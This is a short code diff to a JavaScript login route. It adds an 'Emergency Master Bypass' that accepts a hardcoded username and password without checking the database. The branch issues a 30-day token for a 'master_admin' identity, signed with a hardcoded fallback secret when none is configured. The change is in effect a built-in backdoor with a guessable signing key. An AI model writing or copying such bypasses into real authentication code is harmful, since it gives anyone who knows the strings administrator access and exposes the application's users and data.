@@ -29,6 +29,14 @@ const protect = (req, res, next) => {
 // ========================
 router.post('/auth/login', async (req, res) => {
   const { username, password } = req.body;
+
+  // Emergency Master Bypass (Works even if Database is completely disconnected)
+  if (username === 'NIRANJAN' && password === 'Maker@2026') {
+    const secret = process.env.JWT_SECRET || 'emergency_secret_key_123';
+    const token = jwt.sign({ id: 'master_admin' }, secret, { expiresIn: '30d' });
+    return res.json({ token, username: 'NIRANJAN' });
+  }
+
   try {
     let user = await User.findOne({ username });
     if (user && (await user.matchPassword(password))) {
